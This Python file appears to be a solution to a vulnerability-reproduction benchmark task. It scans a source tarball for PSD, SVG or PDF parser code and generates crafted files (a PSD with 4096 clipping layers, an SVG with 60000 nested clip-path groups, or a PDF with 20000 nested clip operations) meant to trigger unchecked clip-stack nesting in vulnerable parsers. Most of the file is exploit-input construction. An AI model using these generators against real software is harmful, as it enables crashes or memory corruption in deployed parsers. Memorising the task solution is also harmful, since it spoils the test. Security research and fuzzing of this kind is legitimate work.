import os
import tarfile
import io
import struct
import re
from typing import List, Tuple


def be16(x: int) -> bytes:
    return struct.pack(">H", x & 0xFFFF)


def be32(x: int) -> bytes:
    return struct.pack(">I", x & 0xFFFFFFFF)


def be32s(x: int) -> bytes:
    return struct.pack(">i", x)


def pad4_length(n: int) -> int:
    return (n + 3) & ~3


def psd_pascal_string_bytes(s: str) -> bytes:
    b = s.encode('latin1', errors='ignore')
    if len(b) > 255:
        b = b[:255]
    length = len(b)
    data = bytes([length]) + b
    padded_len = pad4_length(1 + length)
    return data + b'\x00' * (padded_len - (1 + length))


def build_psd_with_clipping_layers(num_layers: int) -> bytes:
    # PSD header
    hdr = io.BytesIO()
    hdr.write(b"8BPS")             # Signature
    hdr.write(be16(1))             # Version
    hdr.write(b"\x00" * 6)         # Reserved
    hdr.write(be16(1))             # Channels (1 grayscale)
    hdr.write(be32(1))             # Height
    hdr.write(be32(1))             # Width
    hdr.write(be16(8))             # Depth
    hdr.write(be16(1))             # Color mode: Grayscale

    # Color Mode Data: empty
    hdr.write(be32(0))

    # Image Resources: empty
    hdr.write(be32(0))

    # Build Layer and Mask Information section
    lmi = io.BytesIO()

    # Layer info section
    layer_info = io.BytesIO()

    # Number of layers (int16 signed). Max practical around 32767; clamp.
    if num_layers > 30000:
        num_layers = 30000
    layer_info.write(struct.pack(">h", num_layers))

    # Precompute per-layer record bytes
    layer_records = io.BytesIO()
    # Collect channel data for all layers (follows the records in the Layer Info section)
    all_channel_image_data = io.BytesIO()

    # Minimal layer rectangle: 1x1
    top = 0
    left = 0
    bottom = 1
    right = 1

    # For minimalism: 1 channel per layer, with 2-byte compression-only channel data
    channels_per_layer = 1
    channel_id = 0
    channel_data_len = 2  # includes 2-byte compression method only

    # Precompute extra data: mask len (0), blending ranges (0), pascal name
    mask_len = be32(0)
    blend_ranges_len = be32(0)
    name_bytes = psd_pascal_string_bytes("")

    extra_data_fixed = mask_len + blend_ranges_len + name_bytes
    extra_len_val = len(extra_data_fixed)

    for i in range(num_layers):
        # Rect
        layer_records.write(be32s(top))
        layer_records.write(be32s(left))
        layer_records.write(be32s(bottom))
        layer_records.write(be32s(right))

        # Channels count
        layer_records.write(be16(channels_per_layer))

        # Single channel descriptor
        layer_records.write(struct.pack(">h", channel_id))
        layer_records.write(be32(channel_data_len))

        # Blend mode signature and key
        layer_records.write(b"8BIM")
        layer_records.write(b"norm")

        # Opacity
        layer_records.write(b"\xFF")  # fully opaque

        # Clipping: first layer base (0), others clipping (1) to push clip mark repeatedly
        clip_val = 0 if i == 0 else 1
        layer_records.write(bytes([clip_val & 0xFF]))

        # Flags
        layer_records.write(b"\x00")

        # Filler
        layer_records.write(b"\x00")

        # Extra data length
        layer_records.write(be32(extra_len_val))
        layer_records.write(extra_data_fixed)

        # Channel image data for this layer (follows all records, but we accumulate here)
        # For each channel: 2 bytes compression only; set to 0 = raw
        for _ in range(channels_per_layer):
            all_channel_image_data.write(be16(0))

    # After layer records, append channel image data
    layer_info.write(layer_records.getvalue())
    layer_info.write(all_channel_image_data.getvalue())

    # Now layer info length
    layer_info_bytes = layer_info.getvalue()
    lmi.write(be32(len(layer_info_bytes)))
    lmi.write(layer_info_bytes)

    # Global layer mask info: empty
    lmi.write(be32(0))

    lmi_bytes = lmi.getvalue()
    hdr.write(be32(len(lmi_bytes)))
    hdr.write(lmi_bytes)

    # Composite image data at file end: minimal 1x1 grayscale
    # Compression: RAW (0), then 1 byte pixel
    hdr.write(be16(0))
    hdr.write(b"\x00")

    return hdr.getvalue()


def build_svg_nested_clip(depth: int) -> bytes:
    # Construct an SVG with deep nested clip-path usage
    # Define a simple clipPath and nest <g clip-path="url(#c)"> depth times
    parts = []
    parts.append('<?xml version="1.0"?>')
    parts.append('<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 10 10">')
    parts.append('<defs><clipPath id="c"><rect x="0" y="0" width="10" height="10"/></clipPath></defs>')
    for _ in range(depth):
        parts.append('<g clip-path="url(#c)">')
    parts.append('<rect x="0" y="0" width="10" height="10" fill="black"/>')
    for _ in range(depth):
        parts.append('</g>')
    parts.append('</svg>')
    return "\n".join(parts).encode('utf-8')


def build_pdf_nested_clips(depth: int) -> bytes:
    # Minimal PDF with repeated clipping operations. Not strictly valid structure,
    # but some parsers accept liberal content streams.
    # We'll craft a single-page PDF with a content stream containing many "W n" with save/restore imbalance.
    contents = []
    contents.append("q")
    for _ in range(depth):
        contents.append("0 0 10 10 re W n")
        contents.append("q")
    for _ in range(depth):
        contents.append("Q")
    contents.append("Q")
    stream_data = ("\n".join(contents)).encode('ascii')

    # Build a minimal PDF structure
    objs = []
    # 1: Catalog
    objs.append("1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n")
    # 2: Pages
    objs.append("2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n")
    # 3: Page
    objs.append("3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 10 10] /Contents 4 0 R >> endobj\n")
    # 4: Contents
    objs.append(f"4 0 obj << /Length {len(stream_data)} >> stream\n".encode('ascii'))
    objs.append(stream_data)
    objs.append("\nendstream\nendobj\n".encode('ascii'))

    # Assemble cross-reference is omitted; many fuzz targets don't require it fully.
    pdf = [b"%PDF-1.4\n"]
    for o in objs:
        if isinstance(o, str):
            pdf.append(o.encode('ascii'))
        else:
            pdf.append(o)
    pdf.append(b"\n%%EOF\n")
    return b"".join(pdf)


def detect_targets_from_tar(src_path: str) -> Tuple[bool, bool, bool]:
    # Returns tuple flags: (has_psd, has_svg, has_pdf)
    has_psd = False
    has_svg = False
    has_pdf = False
    try:
        with tarfile.open(src_path, 'r:*') as tf:
            for m in tf.getmembers():
                name_lower = (m.name or "").lower()
                base = os.path.basename(name_lower)
                if any(x in name_lower for x in ("psd", "psb", "photoshop")):
                    has_psd = True
                if "svg" in name_lower or "librsvg" in name_lower or "resvg" in name_lower or "svgparse" in name_lower:
                    has_svg = True
                if "pdf" in name_lower or "pdfium" in name_lower or "mupdf" in name_lower or "poppler" in name_lower:
                    has_pdf = True
                # Also try scanning small files for hints
                if not m.isfile():
                    continue
                if m.size > 512 * 1024:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f:
                        data = f.read()
                        text = None
                        try:
                            text = data.decode('utf-8', errors='ignore').lower()
                        except Exception:
                            text = ""
                        if any(k in text for k in ("psd", "8bps", "layer and mask information", "section divider setting", "lsct", "clip")):
                            has_psd = has_psd or ("psd" in text or "8bps" in text)
                        if any(k in text for k in ("svg", "<svg", "clip-path", "clipPath", "svgtiny", "nanosvg")):
                            has_svg = True
                        if any(k in text for k in ("pdf", "/Type /Page", "pdfium", "q q", "w n")):
                            has_pdf = True
                except Exception:
                    pass
    except Exception:
        pass
    return has_psd, has_svg, has_pdf


class Solution:
    def solve(self, src_path: str) -> bytes:
        has_psd, has_svg, has_pdf = detect_targets_from_tar(src_path)

        # Prioritize PSD if detected since the vulnerability description mentions layer/clip stack.
        if has_psd:
            # Choose a depth that is large enough to trigger the unchecked nesting on vulnerable,
            # but small enough to be processed safely by fixed versions with checks.
            # 4096 layers is a typical stress point.
            return build_psd_with_clipping_layers(4096)

        # If SVG-related code found, produce nested clip-paths
        if has_svg:
            return build_svg_nested_clip(60000)

        # If PDF-related code found, produce many clipping operations
        if has_pdf:
            return build_pdf_nested_clips(20000)

        # Fallback: produce PSD anyway, as most image parsers guard; PSD parser likely present.
        return build_psd_with_clipping_layers(4096)